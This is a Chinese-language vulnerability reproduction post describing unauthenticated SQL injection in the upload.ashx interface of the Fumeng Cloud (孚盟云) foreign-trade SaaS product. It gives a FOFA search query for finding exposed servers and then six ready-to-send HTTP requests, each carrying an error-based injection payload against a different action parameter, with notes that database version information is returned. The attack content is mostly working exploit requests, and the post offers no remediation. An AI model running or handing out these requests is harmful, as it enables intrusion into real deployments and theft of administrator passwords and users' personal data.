## 漏洞简介

上海孚盟软件有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云upload.ashx接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## 影响版本

## fofa语法

> app="孚盟软件-孚盟云"
## 漏洞复现

## showImgss

```HTTP
GET /Ajax/upload.ashx?action=showImgss&FID=%31%27%20%61%6e%64%20%31%3d%63%6f%6e%76%65%72%74%28%69%6e%74%2c%40%40%76%65%72%73%69%6f%6e%29%2d%2d HTTP/1.1
Host: x.x.x.x
```


![[Pasted image 20250828143107.png]]
成功延时 4 秒

## deletefile

```HTTP
GET /Ajax/upload.ashx?action=deletefile&name=%31%27%20%61%6e%64%20%31%3d%63%6f%6e%76%65%72%74%28%69%6e%74%2c%40%40%76%65%72%73%69%6f%6e%29%2d%2d HTTP/1.1
Host: fumacrm.mrxn.net
X-Forwarded-For: 127.0.0.1
Cookie: poc=SQLI_POC
```

![[Pasted image 20250828143611.png]]

成功利用报错注入在响应回显数据库版本信息

## showSmallImg

```HTTP
GET /Ajax/upload.ashx?action=showSmallImg&id=%31%27%20%61%6e%64%20%31%3d%63%6f%6e%76%65%72%74%28%69%6e%74%2c%40%40%76%65%72%73%69%6f%6e%29%2d%2d&tabpoc=bfContacts&imgField=FID HTTP/1.1
Host: fumacrm.mrxn.net
```

![[Pasted image 20250828143148.png]]

成功利用报错注入在响应回显数据库版本信息

## showProdImg

```HTTP
GET /Ajax/upload.ashx?action=showProdImg&FID=%31%27%20%61%6e%64%20%31%3d%63%6f%6e%76%65%72%74%28%69%6e%74%2c%40%40%76%65%72%73%69%6f%6e%29%2d%2d HTTP/1.1
Host: fumacrm.mrxn.net
```

![[Pasted image 20250828145917.png]]

成功利用报错注入在响应回显数据库版本信息

## **image**

```HTTP
GET /Ajax/upload.ashx?action=image&CardID=%31%27%20%61%6e%64%20%31%3d%63%6f%6e%76%65%72%74%28%69%6e%74%2c%40%40%76%65%72%73%69%6f%6e%29%2d%2d&imagefb=FID HTTP/1.1
Host: fumacrm.mrxn.net
```

![[Pasted image 20250828143230.png]]

成功利用报错注入在响应回显数据库版本信息

## DownLoadFieldAttch

```HTTP
GET /Ajax/upload.ashx?action=DownLoadFieldAttch&trueFileName=%31%27%20%61%6e%64%20%31%3d%63%6f%6e%76%65%72%74%28%69%6e%74%2c%40%40%76%65%72%73%69%6f%6e%29%2d%2d HTTP/1.1
Host: fumacrm.mrxn.net
```
![[Pasted image 20250828143557.png]]

成功利用报错注入在响应回显数据库版本信息